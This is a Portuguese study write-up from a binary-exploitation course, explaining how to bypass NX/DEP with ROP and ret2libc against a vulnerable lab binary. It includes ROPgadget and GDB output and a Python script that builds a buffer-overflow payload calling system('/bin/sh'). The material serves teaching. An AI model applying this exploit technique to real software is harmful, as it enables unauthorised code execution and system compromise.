### Bypass NX/DEP

### Esse texto reúne o que aprendi sobre bypass de NX juntando as video aulas do curso CEB(https://www.youtube.com/playlist?list=PLIfZMtpPYFP4MaQhy_iR8uM0mJEs7P7s3) de exploração de binarios. Aula do 07 a 14.

Primeiro vamos a uma breve introdução sobre o NX ou também conhecido como DEP(Data Execution Prevention):

O NX/DEP é uma técnica de mitigação de exploração usada para garantir que apenas segmentos de código são sempre marcados como executáveis...

Ok, mas como assim somente segmentos de código marcados como executáveis??

Bom, vamos lá. Nos writeups anteriores vimos que para explorar os binários, usamos a técnica de Buffer-overflow para sobrescrever um endereço de retorno e, logo depois dessa sobrescrita, jogamos algum shellcode na stack, para assim ganharmos controle sobre o fluxo de execução do binário. Essa exploração só é possível porque o binário em questão foi compilado com a flag ``` -z execstack ``` que desabilita a proteção NX.

Agora com a proteção ativada, as areas da stack e heap NÃO possuem permissão de execução. Sendo assim, não será possível realizar a exploração jogando algum shellcode na stack, porque simplesmente não será executado (e provavelmente resultara em um SEGFAULT).

Sabendo disso, vamos para a parte do bypass...

### Bypass

* "If you can’t inject (shell)code to do your bidding, you
must re-use the existing code!" RPISEC - MBE lecture_07

Se você não pode injetar código... reutilize o código existente.


O bypass mais conhecido para o NX é o ROP ```(Return Oriented Programming)```. ROP é uma técnica para reutilizar código/instruções existentes em um binário para montar algo malicioso. Outros termos conhecidos são ``` ROPgadgets/Gadgets ``` e ``` ROPchain ```.

Os ``` ROPgadgets ``` ou só ``` Gadgets ``` basicamente são instruções presentes na memória do binário, que não fazem parte da execução da ```main```, mas podem ser utilizadas porque são parte da execução do binário (e geralemente terminam com uma instrução ```RET```). Esses gadgets podem ser usados para montar instruções maliciosas semelhante a um shellcode. A junção desses gadgets é chamada de ``` ROPchain ```.


### Tudo bem, ja sabemos o que é o NX e qual tecnica é usada para "bypassa-lo". Agora vamos para a demonstração:

A ideia é a seguinte: já que não podemos executar um shellcode através da stack, temos que executar algo parecido, então vamos usar a técnica ```ret2libc```. Essa técnica consiste em fazer o binário chamar funções da libc usando os endereços de memória carregados pelo próprio binário em tempo de execução. 

Para o exemplo chamaremos a função ```system()```, e como a função system() sem argumentos não faz nada, vamos passar pra ela a string ```"/bin/sh"``` . Dessa forma temos algo parecido com um shellcode.

### Step by step da exploração

#### 1 - O binário usado de exemplo nas aulas era vulneravel a um B.O.F, então a primeira coisa a fazer é estourar o buffer e controlar algum endereço de retorno.


#### 2 - Depois de explorar o B.O.F precisamos saber qual ```Gadget``` pode ser usado de forma maliciosa. Para isso vamos usar a tool ROPgadget (https://github.com/JonathanSalwan/ROPgadget) .

Vamos procurar ```gadgets``` filtrando por ```"pop rdi"```. Porque os registradores ```RDI``` e ```RSI``` são usados para passagem de argumentos na arquitetura de 64 bits. Para que o argumento "/bin/sh" seja passado para a função system ele precisa estar em algum desses registradores.

Rodando a tool e analisando a saida, vemos a instrução que precisamos:

```sh
$ ROPgadget --binary aula_13 --ropchain | grep "pop"

...

0x00000000004011ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004011af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401109 : pop rbp ; ret
0x00000000004011b3 : pop rdi ; ret 	<====== essa aqui
0x00000000004011b1 : pop rsi ; pop r15 ; ret
0x00000000004011ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

Deixe o endereço separado e vamos para o próximo passo.


#### 3 - Agora precisamos achar o endereço da string ```"/bin/sh"``` na memória a qual o binário tem acesso em tempo de execução. 

Para isso vamos rodar o binário no GDB, setar um breakpoint qualquer e logo depois da execução parar no breakpoint, vamos buscar pela string "/bin/sh" da seguinte forma: ``` gdb-peda$ find "/bin/sh" ```

```sh
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7f745bd --> 0x68732f6e69622f ('/bin/sh')
```

Deixe esse endereço separado também e vamos para o próximo passo.



#### 4 - A ultima das nossas buscas será pelo endereço da função ```system()```. Fazendo da mesma forma que o endereço de "/bin/sh".

Rode o binário no GDB, sete um breakpoint qualquer e logo depois da execução parar no breakpoint, busque pelo endereço da seguinte forma: ``` gdb-peda$ p system ```


```sh
gdb-peda$ p system
$1 = {int (const char *)} 0x7ffff7e12290 <__libc_system>
```


#### 5 - Depois de ter os endereços necessários vamos montar o script do exploit:


```py
import struct

buf = b""
buf += b"A"*88                              #JUNK
buf += struct.pack("<Q", 0x4011b3)      #POP RDI; RET;
buf += struct.pack("<Q", 0x7ffff7f745bd)    #POINTER TO "/bin/sh"
buf += struct.pack("<Q", 0x7ffff7e12290)    #SYSTEM ADDR

f = open("exp", "wb")
f.write(buf)
```


#### 6 - Agora com tudo pronto vamos executar o exploit e ver como tudo funciona:


* RET sobrescrito com o Gadget

![nx1](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx1.png)


* O "/bin/sh" seguido pela função system na stack

![nx2](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx2.png)


* "/bin/sh" passado para o registrador RDI

![nx3](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx3.png)


* entrando na função system 

![nx4](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx4.png)


* GDB termina execução e sai startando um novo processo

![nx5](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx5.png)


* rodando a exploração fora do GDB

![nx6](https://github.com/geleiaa/lowlevel_things/blob/main/imgs/bpnx6.png)

